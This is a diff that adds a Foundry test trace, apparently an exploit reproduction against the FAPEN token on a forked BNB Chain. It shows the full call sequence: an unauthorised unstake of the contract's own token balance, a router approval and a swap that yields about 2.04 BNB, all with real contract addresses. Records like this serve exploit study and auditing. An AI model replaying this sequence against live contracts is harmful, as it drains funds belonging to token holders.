@@ -1,0 +1,88 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/FAPEN_exp.sol:ContractTest
+[PASS] testUnstake() (gas: 152410)
+Logs:
+  Amount of BNB before attack: 0.000000000000000000
+  Amount of BNB after attack: 2.042256597375684021
+
+Traces:
+  [14797] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 28637846 [2.863e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(FAPEN: [0xf3F1aBae8BfeCA054B330C379794A7bf84988228], "FAPEN")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], "WBNB")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], "Router")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [195010] ContractTest::testUnstake()
+    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Amount of BNB before attack", val: 0, decimals: 18)
+    ├─ [2864] FAPEN::balanceOf(FAPEN: [0xf3F1aBae8BfeCA054B330C379794A7bf84988228]) [staticcall]
+    │   └─ ← [Return] 9521992386510669 [9.521e15]
+    ├─ [26475] FAPEN::unstake(9521992386510669 [9.521e15])
+    │   ├─  storage changes:
+    │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0 → 0x0000000000000000000000000000000000000000000000000021d4339dc07f4d
+    │   │   @ 0x943743346439b90e183e69fcfa42d7a8e4a74cd0d6c65c5f9e391e726cc8af5a: 0x0000000000000000000000000000000000000000000000000021d4339dc07f4d → 0
+    │   └─ ← [Stop]
+    ├─ [25149] FAPEN::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─  storage changes:
+    │   │   @ 0x456dedb1d997b8b1f0bb8b82f1d2f9fd65d83282b15461207ede66af5f5ba67f: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   └─ ← [Return] true
+    ├─ [864] FAPEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 9521992386510669 [9.521e15]
+    ├─ [113651] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(9521992386510669 [9.521e15], 0, [0xf3F1aBae8BfeCA054B330C379794A7bf84988228, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1685373653 [1.685e9])
+    │   ├─ [16223] FAPEN::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1d1043D07B842c97a948E51c50470FDc7A02B9da, 9521992386510669 [9.521e15])
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x1d1043D07B842c97a948E51c50470FDc7A02B9da, value: 9426772462645563 [9.426e15])
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: FAPEN: [0xf3F1aBae8BfeCA054B330C379794A7bf84988228], value: 95219923865106 [9.521e13])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x456dedb1d997b8b1f0bb8b82f1d2f9fd65d83282b15461207ede66af5f5ba67f: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffffffde2bcc623f80b2
+    │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0x0000000000000000000000000000000000000000000000000021d4339dc07f4d → 0
+    │   │   │   @ 0x416dd534323a44f1a18cce9ee8906900d0173d68ec910b74c2223228dec62a7c: 0x0000000000000000000000000000000000000000000000000037c2306b1f901b → 0x00000000000000000000000000000000000000000000000000593fc9eb234156
+    │   │   │   @ 0x943743346439b90e183e69fcfa42d7a8e4a74cd0d6c65c5f9e391e726cc8af5a: 0 → 0x0000000000000000000000000000000000000000000000000000569a1dbcce12
+    │   │   └─ ← [Return] true
+    │   ├─ [2893] 0x1d1043D07B842c97a948E51c50470FDc7A02B9da::getReserves() [staticcall]
+    │   │   └─ ← [Return] 5450932044005715904 [5.45e18], 15694636930535451 [1.569e16], 1685373266 [1.685e9]
+    │   ├─ [864] FAPEN::balanceOf(0x1d1043D07B842c97a948E51c50470FDc7A02B9da) [staticcall]
+    │   │   └─ ← [Return] 25121409393181014 [2.512e16]
+    │   ├─ [67172] 0x1d1043D07B842c97a948E51c50470FDc7A02B9da::swap(2042256597375684021 [2.042e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
+    │   │   ├─ [29962] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 2042256597375684021 [2.042e18])
+    │   │   │   ├─ emit Transfer(from: 0x1d1043D07B842c97a948E51c50470FDc7A02B9da, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 2042256597375684021 [2.042e18])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x3bd09b7c6666dcc8262e4a390c4717934e3cae15fb9925d6d427a669cdd17813: 0x0000000000000000000000000000000000000000000000004ba599d051c12fc0 → 0x0000000000000000000000000000000000000000000000002f4e0c423efaa20b
+    │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0 → 0x0000000000000000000000000000000000000000000000001c578d8e12c68db5
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [534] WBNB::balanceOf(0x1d1043D07B842c97a948E51c50470FDc7A02B9da) [staticcall]
+    │   │   │   └─ ← [Return] 3408675446630031883 [3.408e18]
+    │   │   ├─ [864] FAPEN::balanceOf(0x1d1043D07B842c97a948E51c50470FDc7A02B9da) [staticcall]
+    │   │   │   └─ ← [Return] 25121409393181014 [2.512e16]
+    │   │   ├─ emit Sync(reserve0: 3408675446630031883 [3.408e18], reserve1: 25121409393181014 [2.512e16])
+    │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 9426772462645563 [9.426e15], amount0Out: 2042256597375684021 [2.042e18], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
+    │   │   ├─  storage changes:
+    │   │   │   @ 8: 0x6474c1520000000000000037c2306b1f901b0000000000004ba599d051c12fc0 → 0x6474c2d500000000000000593fc9eb2341560000000000002f4e0c423efaa20b
+    │   │   │   @ 9: 0x00000000000000000000000000000000004e5723b34c4298f88920276dcd8912 → 0x00000000000000000000000000000000004f7464ac39a25f8a8850be69ae45f3
+    │   │   │   @ 10: 0x000000000000000000000000000000747a595857499794c06047f064a742c766 → 0x000000000000000000000000000000768762ff76c0f09eb3c9d81743bcea5ef8
+    │   │   └─ ← [Stop]
+    │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
+    │   │   └─ ← [Return] 2042256597375684021 [2.042e18]
+    │   ├─ [9223] WBNB::withdraw(2042256597375684021 [2.042e18])
+    │   │   ├─ [83] Router::fallback{value: 2042256597375684021}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 2042256597375684021 [2.042e18])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0x0000000000000000000000000000000000000000000000001c578d8e12c68db5 → 0
+    │   │   └─ ← [Stop]
+    │   ├─ [55] ContractTest::receive{value: 2042256597375684021}()
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ emit log_named_decimal_uint(key: "Amount of BNB after attack", val: 2042256597375684021 [2.042e18], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.91s (3.13s CPU time)
+
+Ran 1 test suite in 3.92s (3.91s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
